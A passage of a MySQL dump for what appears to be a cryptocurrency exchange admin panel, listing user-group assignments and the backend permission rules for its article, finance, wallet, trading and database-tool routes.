  KEY `uid` (`uid`),
  KEY `group_id` (`group_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of movesay_auth_group_access
-- ----------------------------
INSERT INTO `movesay_auth_group_access` VALUES ('2', '3');
INSERT INTO `movesay_auth_group_access` VALUES ('3', '2');
INSERT INTO `movesay_auth_group_access` VALUES ('4', '11');
INSERT INTO `movesay_auth_group_access` VALUES ('6', '12');
INSERT INTO `movesay_auth_group_access` VALUES ('7', '13');
INSERT INTO `movesay_auth_group_access` VALUES ('9', '12');
INSERT INTO `movesay_auth_group_access` VALUES ('10', '11');
INSERT INTO `movesay_auth_group_access` VALUES ('11', '12');
INSERT INTO `movesay_auth_group_access` VALUES ('12', '11');

-- ----------------------------
-- Table structure for `movesay_auth_rule`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_auth_rule`;
CREATE TABLE `movesay_auth_rule` (
  `id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT COMMENT '规则id,自增主键',
  `module` varchar(20) NOT NULL COMMENT '规则所属module',
  `type` tinyint(2) NOT NULL DEFAULT '1' COMMENT '1-url;2-主菜单',
  `name` char(80) NOT NULL DEFAULT '' COMMENT '规则唯一英文标识',
  `title` char(20) NOT NULL DEFAULT '' COMMENT '规则中文描述',
  `status` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否有效(0:无效,1:有效)',
  `condition` varchar(300) NOT NULL DEFAULT '' COMMENT '规则附加条件',
  PRIMARY KEY (`id`),
  KEY `module` (`module`,`status`,`type`)
) ENGINE=MyISAM AUTO_INCREMENT=1897 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of movesay_auth_rule
-- ----------------------------
INSERT INTO `movesay_auth_rule` VALUES ('425', 'admin', '1', 'Admin/article/add', '新增', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('427', 'admin', '1', 'Admin/article/setStatus', '改变状态', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('428', 'admin', '1', 'Admin/article/update', '保存', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('429', 'admin', '1', 'Admin/article/autoSave', '保存草稿', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('430', 'admin', '1', 'Admin/article/move', '移动', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('432', 'admin', '2', 'Admin/Article/mydocument', '内容', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('437', 'admin', '1', 'Admin/Trade/config', '交易配置', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('449', 'admin', '1', 'Admin/Index/operate', '市场统计', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('455', 'admin', '1', 'Admin/Issue/config', '认购配置', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('457', 'admin', '1', 'Admin/Index/database/type/export', '数据备份', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('461', 'admin', '1', 'Admin/Article/chat', '聊天列表', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('464', 'admin', '1', 'Admin/Index/database/type/import', '数据还原', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('471', 'admin', '1', 'Admin/Mytx/config', '提现配置', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('472', 'admin', '2', 'Admin/Mytx/index', '提现', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('473', 'admin', '1', 'Admin/Config/market', '市场配置', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('477', 'admin', '1', 'Admin/User/myzr', '转入虚拟币', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('479', 'admin', '1', 'Admin/User/myzc', '转出虚拟币', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('482', 'admin', '2', 'Admin/ExtA/index', '扩展', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('488', 'admin', '1', 'Admin/Auth_manager/createGroup', '新增用户组', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('499', 'admin', '1', 'Admin/ExtA/index', '扩展管理', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('509', 'admin', '1', 'Admin/Article/adver_edit', '编辑', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('510', 'admin', '1', 'Admin/Article/adver_status', '修改', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('513', 'admin', '1', 'Admin/Issue/index_edit', '认购编辑', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('514', 'admin', '1', 'Admin/Issue/index_status', '认购修改', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('515', 'admin', '1', 'Admin/Article/chat_edit', '编辑', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('516', 'admin', '1', 'Admin/Article/chat_status', '修改', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('517', 'admin', '1', 'Admin/User/coin_edit', 'coin修改', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('519', 'admin', '1', 'Admin/Mycz/type_status', '状态修改', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('520', 'admin', '1', 'Admin/Issue/log_status', '认购状态', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('521', 'admin', '1', 'Admin/Issue/log_jiedong', '认购解冻', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('522', 'admin', '1', 'Admin/Tools/database/type/export', '数据备份', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('525', 'admin', '1', 'Admin/Config/coin_edit', '编辑', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('526', 'admin', '1', 'Admin/Config/coin_add', '编辑币种', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('527', 'admin', '1', 'Admin/Config/coin_status', '状态修改', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('528', 'admin', '1', 'Admin/Config/market_edit', '编辑', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('530', 'admin', '1', 'Admin/Tools/database/type/import', '数据还原', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('541', 'admin', '2', 'Admin/Trade/config', '交易', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('569', 'admin', '1', 'Admin/ADVERstatus', '修改', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('570', 'admin', '1', 'Admin/Tradelog/index', '交易记录', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('585', 'admin', '1', 'Admin/Config/mycz', '充值配置', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('590', 'admin', '1', 'Admin/Mycztype/index', '充值类型', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('600', 'admin', '1', 'Admin/Usergoods/index', '用户联系地址', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1379', 'admin', '1', 'Admin/Bazaar/index', '集市管理', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1405', 'admin', '1', 'Admin/Bazaar/config', '集市配置', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1425', 'admin', '1', 'Admin/Bazaar/log', '集市记录', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1451', 'admin', '1', 'Admin/Bazaar/invit', '集市推广', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1697', 'admin', '1', 'Admin/AuthManager/createGroup', '新增用户组', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1698', 'admin', '1', 'Admin/AuthManager/editgroup', '编辑用户组', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1699', 'admin', '1', 'Admin/AuthManager/writeGroup', '更新用户组', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1700', 'admin', '1', 'Admin/AuthManager/changeStatus', '改变状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1701', 'admin', '1', 'Admin/AuthManager/access', '访问授权', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1702', 'admin', '1', 'Admin/AuthManager/category', '分类授权', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1703', 'admin', '1', 'Admin/AuthManager/user', '成员授权', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1704', 'admin', '1', 'Admin/AuthManager/tree', '成员列表授权', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1705', 'admin', '1', 'Admin/AuthManager/group', '用户组', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1706', 'admin', '1', 'Admin/AuthManager/addToGroup', '添加到用户组', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1707', 'admin', '1', 'Admin/AuthManager/removeFromGroup', '用户组移除', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1708', 'admin', '1', 'Admin/AuthManager/addToCategory', '分类添加到用户组', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1709', 'admin', '1', 'Admin/AuthManager/addToModel', '模型添加到用户组', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1710', 'admin', '1', 'Admin/Trade/status', '修改状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1711', 'admin', '1', 'Admin/Trade/chexiao', '撤销挂单', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1712', 'admin', '1', 'Admin/Shop/images', '图片', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1713', 'admin', '1', 'Admin/Login/index', '用户登录', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1714', 'admin', '1', 'Admin/Login/loginout', '用户退出', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1715', 'admin', '1', 'Admin/User/setpwd', '修改管理员密码', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1716', 'admin', '2', 'Admin/Index/index', '系统', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1717', 'admin', '2', 'Admin/Article/index', '内容', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1718', 'admin', '2', 'Admin/User/index', '用户', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1719', 'admin', '2', 'Admin/Finance/index', '财务', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1720', 'admin', '2', 'Admin/Trade/index', '交易', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1721', 'admin', '2', 'Admin/Game/index', '应用', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1722', 'admin', '2', 'Admin/Config/index', '设置', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1723', 'admin', '2', 'Admin/Operate/index', '运营', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1724', 'admin', '2', 'Admin/Tools/index', '工具', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1725', 'admin', '2', 'Admin/Cloud/index', '扩展', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1726', 'admin', '1', 'Admin/Index/index', '系统概览', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1727', 'admin', '1', 'Admin/Article/index', '文章管理', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1728', 'admin', '1', 'Admin/Article/edit', '编辑添加', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1729', 'admin', '1', 'Admin/Text/index', '提示文字', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1730', 'admin', '1', 'Admin/Text/edit', '编辑', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1731', 'admin', '1', 'Admin/Text/status', '修改', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1732', 'admin', '1', 'Admin/User/index', '用户管理', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1733', 'admin', '1', 'Admin/Finance/config', '配置', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1734', 'admin', '1', 'Admin/Finance/type', '类型', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1735', 'admin', '1', 'Admin/Finance/type_status', '状态修改', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1736', 'admin', '1', 'Admin/Trade/index', '委托管理', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1737', 'admin', '1', 'Admin/Config/index', '基本配置', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1738', 'admin', '1', 'AdminUser/detail', '后台用户详情', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1739', 'admin', '1', 'AdminUser/status', '后台用户状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1740', 'admin', '1', 'AdminUser/add', '后台用户新增', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1741', 'admin', '1', 'AdminUser/edit', '后台用户编辑', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1742', 'admin', '1', 'Admin/Articletype/edit', '编辑', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1743', 'admin', '1', 'Admin/Finance/index', '财务明细', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1744', 'admin', '1', 'Admin/Finance/myczTypeEdit', '编辑添加', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1745', 'admin', '1', 'Admin/Cloud/index', '云市场', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1746', 'admin', '1', 'Admin/Tools/index', '清理缓存', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1747', 'admin', '1', 'Admin/User/edit', '编辑添加', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1748', 'admin', '1', 'Admin/User/status', '修改状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1749', 'admin', '1', 'Admin/User/adminEdit', '编辑添加', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1750', 'admin', '1', 'Admin/User/adminStatus', '修改状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1751', 'admin', '1', 'Admin/User/authEdit', '编辑添加', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1752', 'admin', '1', 'Admin/User/authStatus', '修改状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1753', 'admin', '1', 'Admin/User/authStart', '重新初始化权限', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1754', 'admin', '1', 'Admin/User/logEdit', '编辑添加', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1755', 'admin', '1', 'Admin/User/logStatus', '修改状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1756', 'admin', '1', 'Admin/User/qianbaoEdit', '编辑添加', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1757', 'admin', '1', 'Admin/User/qianbaoStatus', '修改状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1758', 'admin', '1', 'Admin/User/bankEdit', '编辑添加', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1759', 'admin', '1', 'Admin/User/bankStatus', '修改状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1760', 'admin', '1', 'Admin/User/coinEdit', '编辑添加', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1761', 'admin', '1', 'Admin/User/coinLog', '财产统计', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1762', 'admin', '1', 'Admin/User/goodsEdit', '编辑添加', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1763', 'admin', '1', 'Admin/User/goodsStatus', '修改状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1764', 'admin', '1', 'Admin/Article/typeEdit', '编辑添加', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1765', 'admin', '1', 'Admin/Article/linkEdit', '编辑添加', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1766', 'admin', '1', 'Admin/Article/adverEdit', '编辑添加', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1767', 'admin', '1', 'Admin/User/authAccess', '访问授权', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1768', 'admin', '1', 'Admin/User/authAccessUp', '访问授权修改', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1769', 'admin', '1', 'Admin/User/authUser', '成员授权', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1770', 'admin', '1', 'Admin/User/authUserAdd', '成员授权增加', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1771', 'admin', '1', 'Admin/User/authUserRemove', '成员授权解除', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1772', 'admin', '1', 'Admin/Operate/index', '推广奖励', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1773', 'admin', '1', 'Admin/App/config', 'APP配置', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1774', 'admin', '1', 'Admin/Shop/index', '商品管理', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1775', 'admin', '1', 'Admin/Issue/index', '认购管理', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1776', 'admin', '1', 'Admin/Issue/log', '认购记录', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1777', 'admin', '1', 'Admin/Huafei/index', '充值记录', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1778', 'admin', '1', 'Admin/Huafei/config', '充值配置', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1779', 'admin', '1', 'Admin/Vote/index', '投票记录', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1780', 'admin', '1', 'Admin/Vote/type', '投票类型', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1781', 'admin', '1', 'Admin/Money/index', '理财管理', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1782', 'admin', '1', 'Admin/Article/images', '上传图片', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1783', 'admin', '1', 'Admin/Adver/edit', '编辑', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1784', 'admin', '1', 'Admin/Adver/status', '修改', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1785', 'admin', '1', 'Admin/User/index_edit', '编辑', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1786', 'admin', '1', 'Admin/User/index_status', '修改', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1787', 'admin', '1', 'Admin/Trade/log', '成交记录', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1788', 'admin', '1', 'Admin/Issue/edit', '认购编辑', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1789', 'admin', '1', 'Admin/Issue/status', '认购修改', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1790', 'admin', '1', 'Admin/Config/moble', '短信配置', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1791', 'admin', '1', 'Admin/Invit/config', '推广配置', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1792', 'admin', '1', 'Admin/Link/edit', '编辑', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1793', 'admin', '1', 'Admin/Link/status', '修改', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1794', 'admin', '1', 'Admin/Index/coin', '币种统计', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1795', 'admin', '1', 'Admin/Cloud/update', '自动升级', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1796', 'admin', '1', 'Admin/Article/type', '文章类型', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1797', 'admin', '1', 'Admin/Finance/mycz', '美元充值', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1798', 'admin', '1', 'Admin/Finance/myczTypeStatus', '状态修改', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1799', 'admin', '1', 'Admin/Finance/myczTypeImage', '上传图片', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1800', 'admin', '1', 'Admin/Finance/mytxStatus', '修改状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1801', 'admin', '1', 'Admin/Tools/dataExport', '备份数据库', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1802', 'admin', '1', 'Admin/Tools/dataImport', '还原数据库', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1803', 'admin', '1', 'Admin/User/admin', '管理员管理', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1804', 'admin', '1', 'Admin/App/vip_config_list', 'APP等级', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1805', 'admin', '1', 'Admin/Shop/config', '商城配置', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1806', 'admin', '1', 'Admin/Money/log', '理财日志', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1807', 'admin', '1', 'Admin/Index/market', '市场统计', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1808', 'admin', '1', 'Admin/Chat/edit', '编辑', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1809', 'admin', '1', 'Admin/Chat/status', '修改', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1810', 'admin', '1', 'Admin/Usercoin/edit', '财产修改', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1811', 'admin', '1', 'Admin/Mycz/status', '修改', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1812', 'admin', '1', 'Admin/Mycztype/status', '状态修改', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1813', 'admin', '1', 'Admin/Config/contact', '客服配置', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1814', 'admin', '1', 'Admin/Tools/queue', '服务器队列', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1815', 'admin', '1', 'Admin/Tools/qianbao', '钱包检查', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1816', 'admin', '1', 'Admin/Cloud/game', '应用管理', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1817', 'admin', '1', 'Admin/Article/adver', '广告管理', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1818', 'admin', '1', 'Admin/Trade/chat', '交易聊天', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1819', 'admin', '1', 'Admin/Finance/myczType', '美元充值方式', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1820', 'admin', '1', 'Admin/Finance/mytxExcel', '导出选中', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1821', 'admin', '1', 'Admin/User/auth', '权限列表', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1822', 'admin', '1', 'Admin/App/adsblock_list', 'APP广告板块', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1823', 'admin', '1', 'Admin/Shop/type', '商品类型', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1824', 'admin', '1', 'Admin/Fenhong/index', '分红管理', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1825', 'admin', '1', 'Admin/Huafei/type', '充值金额', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1826', 'admin', '1', 'Admin/Money/fee', '理财明细', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1827', 'admin', '1', 'Admin/Config/bank', '银行配置', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1828', 'admin', '1', 'Admin/Config/bank_edit', '编辑', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1829', 'admin', '1', 'Admin/Coin/edit', '编辑', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1830', 'admin', '1', 'Admin/Coin/status', '状态修改', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1831', 'admin', '1', 'Admin/Market/edit', '编辑市场', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1832', 'admin', '1', 'Admin/Config/market_add', '状态修改', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1833', 'admin', '1', 'Admin/Tools/invoke', '其他模块调用', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1834', 'admin', '1', 'Admin/Tools/optimize', '优化表', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1835', 'admin', '1', 'Admin/Tools/repair', '修复表', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1836', 'admin', '1', 'Admin/Tools/del', '删除备份文件', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1837', 'admin', '1', 'Admin/Tools/export', '备份数据库', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1838', 'admin', '1', 'Admin/Tools/import', '还原数据库', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1839', 'admin', '1', 'Admin/Tools/excel', '导出数据库', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1840', 'admin', '1', 'Admin/Tools/exportExcel', '导出Excel', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1841', 'admin', '1', 'Admin/Tools/importExecl', '导入Excel', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1842', 'admin', '1', 'Admin/User/detail', '用户详情', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1843', 'admin', '1', 'Admin/Trade/comment', '币种评论', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1844', 'admin', '1', 'Admin/Article/link', '友情链接', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1845', 'admin', '1', 'Admin/User/log', '登陆日志', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1846', 'admin', '1', 'Admin/Finance/mytx', '美元提现', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1847', 'admin', '1', 'Admin/Finance/mytxChuli', '正在处理', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1848', 'admin', '1', 'Admin/Config/coin', '币种配置', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1849', 'admin', '1', 'Admin/App/ads_user', 'APP广告用户', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1850', 'admin', '1', 'Admin/Cloud/theme', '主题模板', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1851', 'admin', '1', 'Admin/Shop/coin', '付款方式', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1852', 'admin', '1', 'Admin/Huafei/coin', '付款方式', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1853', 'admin', '1', 'Admin/Mytx/status', '状态修改', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1854', 'admin', '1', 'Admin/Mytx/excel', '取消', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1855', 'admin', '1', 'Admin/Mytx/exportExcel', '导入excel', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1856', 'admin', '1', 'Admin/Menu/index', '菜单管理', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1857', 'admin', '1', 'Admin/Menu/sort', '排序', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1858', 'admin', '1', 'Admin/Menu/add', '添加', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1859', 'admin', '1', 'Admin/Menu/edit', '编辑', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1860', 'admin', '1', 'Admin/Menu/del', '删除', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1861', 'admin', '1', 'Admin/Menu/toogleHide', '是否隐藏', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1862', 'admin', '1', 'Admin/Menu/toogleDev', '是否开发', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1863', 'admin', '1', 'Admin/Menu/importFile', '导入文件', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1864', 'admin', '1', 'Admin/Menu/import', '导入', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1865', 'admin', '1', 'Admin/Config/text', '提示文字', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1866', 'admin', '1', 'Admin/User/qianbao', '用户钱包', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1867', 'admin', '1', 'Admin/Trade/market', '交易市场', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1868', 'admin', '1', 'Admin/Finance/mytxConfig', '美元提现配置', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1869', 'admin', '1', 'Admin/Finance/mytxChexiao', '撤销提现', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1870', 'admin', '1', 'Admin/Cloud/kefu', '客服代码', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1871', 'admin', '1', 'Admin/Cloud/kefuUp', '使用', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1872', 'admin', '1', 'Admin/Shop/log', '购物记录', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1873', 'admin', '1', 'Admin/Fenhong/log', '分红记录', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1874', 'admin', '1', 'Admin/Config/qita', '其他配置', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1875', 'admin', '1', 'Admin/User/bank', '提现地址', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1876', 'admin', '1', 'Admin/Trade/invit', '交易推荐', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1877', 'admin', '1', 'Admin/Finance/myzr', '虚拟币转入', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1878', 'admin', '1', 'Admin/Finance/mytxQueren', '确认提现', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1879', 'admin', '1', 'Admin/Finance/myzcQueren', '确认转出', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1880', 'admin', '1', 'Admin/Shop/goods', '收货地址', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1881', 'admin', '1', 'Admin/Verify/code', '图形验证码', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1882', 'admin', '1', 'Admin/Verify/mobile', '手机验证码', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1883', 'admin', '1', 'Admin/Verify/email', '邮件验证码', '1', '');
